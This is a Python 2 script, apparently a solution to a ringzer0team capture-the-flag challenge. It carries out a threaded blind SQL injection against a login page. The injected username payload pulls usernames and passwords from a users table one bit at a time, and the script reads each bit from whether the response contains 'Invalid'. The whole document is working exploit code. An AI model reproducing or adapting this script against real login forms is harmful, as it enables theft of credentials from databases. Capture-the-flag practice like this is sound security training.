'''
@attention: uninjector4 demo
@author: mrun1k0d3r
'''
import Queue
import threading
import urllib2
import urllib
import time
import sys

threads_response = []
threads_pool = []

def request(position, char_position, q):
    data = "admin') AND IF(SUBSTRING(REVERSE(CONV(HEX(SUBSTRING((SELECT GROUP_CONCAT(username, 0x7c, password) FROM login3.users), " + str(char_position) + ", 1)), 16, 2)), " + str(position) + ", 1) = 1, 3421, 6792) = 3421 #"
    # print data
    request = urllib2.Request("http://ringzer0team.com:31337/login3.php")
    if not urllib2.urlopen(request, "username=" + urllib.quote(data) + "&password=admin").read().find("Invalid") == -1:
        q.put([position ,1])
    else:
        q.put([position, 0])
        
def build_char(thread_array):
    #this shit is ugly better way to do using 1 loop
    char = ""
    for i in range(1, 8):
        for item in thread_array:
            if item[0] == i:
                char += str(item[1])
    char += "0"
    return char
   
# main    
if __name__ == "__main__":
    q = Queue.Queue()
    i = 1
    char = ""
    string = ""
    while not char == "00000000": 
        if len(char) == 8:
            char = str(chr(int(char[::-1], 2)))
            print char
            string += char
            char = ""
        for b in range(1, 8): 
            t = threading.Thread(target=request, args=(b, i, q))
            #t.deamon = True
            threads_pool.append(t)
            t.start()
            threads_response.append(q.get())
            
        [x.join() for x in threads_pool]
        char = build_char(threads_response)
        threads_response = []
        threads_pool = []
        i += 1
    print string
